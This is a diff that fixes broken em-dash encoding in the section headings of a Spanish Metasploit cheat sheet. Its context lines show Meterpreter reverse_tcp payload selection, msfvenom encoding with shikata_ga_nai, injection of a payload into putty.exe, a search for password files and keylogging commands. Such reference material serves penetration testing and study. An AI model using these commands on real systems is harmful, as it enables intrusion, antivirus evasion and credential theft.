@@ -99,7 +99,7 @@ workspace -D
 
 ---
 
-## Exploits â€” Selección
+## Exploits — Selección
 
 | Comando | Descripción |
 |---------|-------------|
@@ -124,7 +124,7 @@ exploit
 # Ejecutar como job en background
 exploit -j
 | ```
-## Exploits â€” Opciones
+## Exploits — Opciones
 
 > [!warning] Configuración
 > Configurar opciones antes de ejecutar.
@@ -214,7 +214,7 @@ show payloads
 # Seleccionar
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 | ```
-## msfvenom â€” Generación de Payloads
+## msfvenom — Generación de Payloads
 
 > [!danger] Generar payloads
 > Fuera de msfconsole, pero la sesión se recibe en msfconsole.
@@ -236,7 +236,7 @@ msfvenom -p ... -e x86/shikata_ga_nai -i 5
 # Inyectar en binario legítimo
 msfvenom -p ... -x putty.exe -k -f exe -o payload.exe
 | ```
-## Meterpreter â€” Comandos Básicos
+## Meterpreter — Comandos Básicos
 
 > [!tip] Shell avanzada
 > In-memory, no escribe en disco.
@@ -267,7 +267,7 @@ exit # vuelve a meterpreter
 
 ---
 
-## Meterpreter â€” Archivos
+## Meterpreter — Archivos
 
 | Comando | Descripción |
 |---------|-------------|
@@ -292,7 +292,7 @@ search -f password*
 
 ---
 
-## Meterpreter â€” Sistema
+## Meterpreter — Sistema
 
 | Comando | Descripción |
 |---------|-------------|
@@ -321,7 +321,7 @@ keyscan_stop
 
 ---
 
-## Meterpreter â€” Red
+## Meterpreter — Red
 
 | Comando | Descripción |
 |---------|-------------|
